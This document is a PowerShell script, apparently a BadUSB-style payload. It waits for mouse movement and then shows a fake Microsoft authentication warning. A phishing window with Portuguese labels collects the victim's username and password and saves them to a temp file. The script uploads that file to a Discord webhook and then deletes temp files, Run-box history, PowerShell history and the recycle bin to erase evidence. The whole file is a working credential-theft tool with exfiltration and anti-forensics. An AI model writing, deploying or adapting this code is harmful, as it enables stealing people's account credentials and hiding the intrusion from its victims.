
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

<#
function Get-Creds {

    $form = $null

    while ($form -eq $null)
    {
        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
        $cred.getnetworkcredential().password

        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
        {
            if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
            {
                Add-Type -AssemblyName PresentationCore,PresentationFramework
            }

            $msgBody = "Credentials cannot be empty!"
            $msgTitle = "Error"
            $msgButton = 'Ok'
            $msgImage = 'Stop'
            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
            Write-Host "The user clicked: $Result"
            $form = $null
        }
        
        else{
            $creds = $cred.GetNetworkCredential() | fl
            return $creds
        }
    }
}
#>

function Get-Creds {
    $form = $null

    while ($form -eq $null) {

        # WPF-based Credential Prompt
        Add-Type -AssemblyName PresentationCore,PresentationFramework 

        $window = New-Object System.Windows.Window
        $window.Title = "Autenticação necessária"
        $window.SizeToContent = 'WidthAndHeight'  
        $window.Icon = # Add a path to an icon file if you'd like

        $grid = New-Object System.Windows.Controls.Grid
        $grid.Margin = 10 
        $window.Content = $grid

        # Labels and Textboxes
        $grid.RowDefinitions.Add((New-Object System.Windows.RowDefinition))
        $grid.RowDefinitions.Add((New-Object System.Windows.RowDefinition))
        $grid.RowDefinitions.Add((New-Object System.Windows.RowDefinition))
        $grid.ColumnDefinitions.Add((New-Object System.Windows.ColumnDefinition))
        $grid.ColumnDefinitions.Add((New-Object System.Windows.ColumnDefinition))

        $usernameLabel = New-Object System.Windows.Controls.Label
        $usernameLabel.Content = "Nome de usuário:" 
        $usernameTextbox = New-Object System.Windows.Controls.TextBox
        $passwordLabel = New-Object System.Windows.Controls.Label
        $passwordLabel.Content = "Senha:" 
        $passwordTextbox = New-Object System.Windows.Controls.PasswordBox

        Grid.SetRow($usernameLabel, 0)
        Grid.SetColumn($usernameLabel, 0)
        Grid.SetRow($usernameTextbox, 0)
        Grid.SetColumn($usernameTextbox, 1) 
        Grid.SetRow($passwordLabel, 1)
        Grid.SetColumn($passwordLabel, 0)
        Grid.SetRow($passwordTextbox, 1)
        Grid.SetColumn($passwordTextbox, 1)

        $grid.Children.Add($usernameLabel) | Out-Null
        $grid.Children.Add($usernameTextbox) | Out-Null
        $grid.Children.Add($passwordLabel) | Out-Null
        $grid.Children.Add($passwordTextbox) | Out-Null

        # Submit Button 
        $submitButton = New-Object System.Windows.Controls.Button
        $submitButton.Content = "Entrar"
        $submitButton.Add_Click({
            # Capture username and password here
            $username = $usernameTextbox.Text
            $password = $passwordTextbox.SecurePassword # SecurePassword for security
            $credsObject = New-Object System.Net.NetworkCredential($username, $password)
            
            # Close window
            $window.Close() 
            $form = $credsObject 
        })

        Grid.SetRow($submitButton, 2)
        Grid.SetColumnSpan($submitButton, 2) 
        $grid.Children.Add($submitButton) | Out-Null 

        # Remember Me Checkbox
        $rememberMeCheckbox = New-Object System.Windows.Controls.CheckBox
        $rememberMeCheckbox.Content = "Lembrar-me"
        Grid.SetRow($rememberMeCheckbox, 2)
        Grid.SetColumn($rememberMeCheckbox, 1)
        $grid.Children.Add($rememberMeCheckbox) | Out-Null

        # Window Styling
        $window.Background = '#fff'
        $usernameLabel.Foreground = '#333'
        $usernameTextbox.Background = '#ddd'
        $passwordLabel.FontSize = 16
        $submitButton.Width = 100
        $submitButton.Margin = 5

        $window.ShowDialog()  

        # Rest of your function logic (error checking, credential return) 
        if([string]::IsNullOrWhiteSpace($password)) { 
            # ... your existing error message code ... 
        } else {
            $creds = $credsObject  # Since we captured the creds object already
            return $creds
        }
    }
}
#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to pause the script until a mouse movement is detected
#>

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#----------------------------------------------------------------------------------------------------

# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 

function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
}
#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
#>

Pause-Script

Caps-Off

Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please authenticate your Microsoft Account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'
$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
Write-Host "The user clicked: $Result"

$creds = Get-Creds

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to save the gathered credentials to a file in the temp directory
#>

echo $creds >> $env:TMP\$FileName

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to upload your files to Discord
#>

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit